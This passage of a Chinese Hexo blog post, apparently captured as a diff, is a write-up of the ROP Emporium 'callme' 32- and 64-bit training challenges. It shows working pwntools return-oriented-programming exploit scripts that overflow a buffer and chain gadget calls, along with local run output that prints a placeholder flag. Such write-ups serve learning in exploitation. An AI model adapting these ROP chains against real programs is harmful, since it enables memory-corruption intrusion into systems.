&apos;A&apos;*44</span><br><span class="line"></span><br><span class="line">payload += p32(callme_one_plt)</span><br><span class="line"></span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">payload += p32(callme_two_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line"></span><br><span class="line">payload += p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">payload += p32(callme_three_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">print io.recvall()</span><br></pre></td></tr></table></figure>
+<p>运行：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/ROP_Emporium/callme32$ python exp.py </span><br><span class="line">[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.</span><br><span class="line">[+] Starting local process &apos;./callme32&apos;: pid 13701</span><br><span class="line">[+] Receiving all data: Done (99B)</span><br><span class="line">[*] Process &apos;./callme32&apos; stopped with exit code 0 (pid 13701)</span><br><span class="line">callme by ROP Emporium</span><br><span class="line">32bits</span><br><span class="line"></span><br><span class="line">Hope you read the instructions...</span><br><span class="line">&gt; ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="callme64-writeup"><a href="#callme64-writeup" class="headerlink" title="callme64 writeup"></a>callme64 writeup</h1><p>既然写过的就快速过一遍，直接写exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./callme&quot;)</span><br><span class="line"></span><br><span class="line">callme_one_plt = 0x401850</span><br><span class="line">callme_two_plt = 0x401870</span><br><span class="line">callme_three_plt = 0x401810</span><br><span class="line"></span><br><span class="line">pppr = 0x401ab0</span><br><span class="line"></span><br><span class="line">payload = &apos;&apos;</span><br><span class="line">payload += &apos;A&apos;*40</span><br><span class="line">payload += p64(pppr)</span><br><span class="line"></span><br><span class="line">payload += p64(1)+p64(2)+p64(3)</span><br><span class="line">payload += p64(callme_one_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(pppr)</span><br><span class="line"></span><br><span class="line">payload +=p64(1)+p64(2)+p64(3)</span><br><span class="line">payload += p64(callme_two_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(pppr)</span><br><span class="line"></span><br><span class="line">payload +=p64(1)+p64(2)+p64(3)</span><br><span class="line">payload += p64(callme_three_plt)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">print io.recvall()</span><br></pre></td></tr></table></figure>
+<p>运行：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/ROP_Emporium/callme$ python exp.py </span><br><span class="line">[+] Starting local process &apos;./callme&apos;: pid 10993</span><br><span class="line">[+] Receiving all data: Done (99B)</span><br><span class="line">[*] Process &apos;./callme&apos; stopped with exit code 0 (pid 10993)</span><br><span class="line">callme by ROP Emporium</span><br><span class="line">64bits</span><br><span class="line"></span><br><span class="line">Hope you read the instructions...</span><br><span class="line">&gt; ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PWN/" rel="tag"># PWN</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/17/三个白帽/" rel="next" title="三个白帽">
+                <i class="fa fa-chevron-left"></i> 三个白帽
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="Mask" />
+            
+              <p class="site-author-name" itemprop="name">Mask</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2win32-Write-up"><span class="nav-number">1.</span> <span class="nav-text">ret2win32 Write up</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-源码分析"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-编写exp"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 编写exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2win-64"><span class="nav-number">2.</span> <span class="nav-text">ret2win 64</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言-1"><span class="nav-number">2.1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-编写exp"><span class="nav-number">2.2.</span> <span class="nav-text">0x01 编写exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Split-32"><span class="nav-number">3.</span> <span class="nav-text">Split 32</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言-2"><span class="nav-number">3.1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-源码分析-1"><span class="nav-number">3.2.</span> <span class="nav-text">0x01 源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-调试"><span class="nav-number">3.3.</span> <span class="nav-text">0x02 调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-编写exp"><span class="nav-number">3.4.</span> <span class="nav-text">0x03 编写exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#callme32-writeup"><span class="nav-number">4.</span> <span class="nav-text">callme32 writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言-3"><span class="nav-number">4.1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-分析"><span class="nav-number">4.2.</span> <span class="nav-text">0x01 分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#callme64-writeup"><span class="nav-number">5.</span> <span class="nav-text">callme64 writeup</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mask</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
